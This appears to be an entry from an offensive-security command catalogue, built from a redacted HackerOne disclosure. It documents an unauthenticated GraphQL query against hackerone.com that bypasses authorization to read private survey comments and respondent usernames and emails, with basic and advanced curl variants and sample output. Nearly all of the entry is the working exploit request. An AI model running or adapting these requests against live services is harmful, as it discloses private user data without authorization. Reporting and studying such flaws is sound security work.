---
id: cmd-curl-graphql-access
data: >-
  curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json"
  -d '{"query":"query { node(id: \"gid://hackerone/SurveyRatingItem/█████\") {
  ... on
  SurveyRatingItem{_id,pentester{_id},team{_id},key,private_comment,public_comment,rating,recipient{username,email},subject{...
  on
  Report{_id}},survey_rating{_id,team{_id},state,respondent{_id,username,email,pentests{nodes{_id}}}}}}}","variables":{}}'
tags:
  - graphql
  - http
  - recon
type: command
output: >-
  {"data":{"node":{"_id":"████████","pentester":null,"team":null,"key":"scope","private_comment":"████","public_comment":null,"rating":1,"recipient":null,"subject":null,"survey_rating":{"_id":"█████","team":null,"state":"completed","respondent":{"_id":"████","username":"███","email":null,"pentests":{"nodes":[]}}}}}}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.244Z'
verified: false
validated: true
submitted: true
---
# curl-graphql-private-comment-access

## Command

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"query":"query { node(id: \"gid://hackerone/SurveyRatingItem/█████\") { ... on SurveyRatingItem{_id,pentester{_id},team{_id},key,private_comment,public_comment,rating,recipient{username,email},subject{... on Report{_id}},survey_rating{_id,team{_id},state,respondent{_id,username,email,pentests{nodes{_id}}}}}}}","variables":{}}'
```

## Description

This command uses curl to send an unauthenticated POST request to the HackerOne GraphQL endpoint, querying a specific SurveyRatingItem node ID to retrieve private fields like private_comment. It demonstrates information disclosure by bypassing authorization checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d '{...}'` | JSON body containing the GraphQL query and empty variables | Yes |
| `https://hackerone.com/graphql` | Target GraphQL endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"query":"query { node(id: \"gid://hackerone/SurveyRatingItem/█████\") { private_comment }}","variables":{}}'
```

### Advanced Usage

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -H "User-Agent: Custom" -d '{"query":"query { node(id: \"gid://hackerone/SurveyRatingItem/█████\") { ... on SurveyRatingItem{private_comment,respondent{username,email}}}}","variables":{}}'
```

## Expected Output

JSON response with data.node containing fields like _id, key (e.g., "scope"), private_comment (e.g., "████"), rating, and respondent details (e.g., username: "███"). Errors may include GraphQL syntax issues or null fields if ID is invalid.

## Related

- [[Related Procedure|procedures/Exploit-GraphQL-Information-Disclosure-in-SurveyRatingItem]]
